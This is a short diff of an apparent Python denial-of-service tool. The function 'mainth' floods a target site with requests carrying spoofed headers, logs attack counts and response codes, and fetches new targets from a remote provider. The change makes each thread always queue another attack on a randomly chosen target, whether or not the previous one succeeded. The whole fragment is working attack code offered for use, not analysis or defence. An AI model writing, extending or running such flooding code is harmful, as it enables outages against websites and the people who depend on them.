@@ -71,8 +71,6 @@ def mainth(site: str):
          'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
          'Accept-Encoding': 'gzip, deflate, br'})
 
-    logger.info("GET RESOURCES FOR ATTACK")
-
     logger.info("STARTING ATTACK TO " + site)
 
     attacks_number = 0
@@ -103,8 +101,8 @@ def mainth(site: str):
                 logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
         if attacks_number > 0:
             logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
-            # when thread finishes, add new task to executor
-            executor.submit(mainth, choice(remoteProvider.get_target_sites()))
+        # when thread finishes, add new task to executor
+        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
     except ConnectionError as exc:
         logger.success(f"{site} is down")
         # when thread finishes, add new task to executor
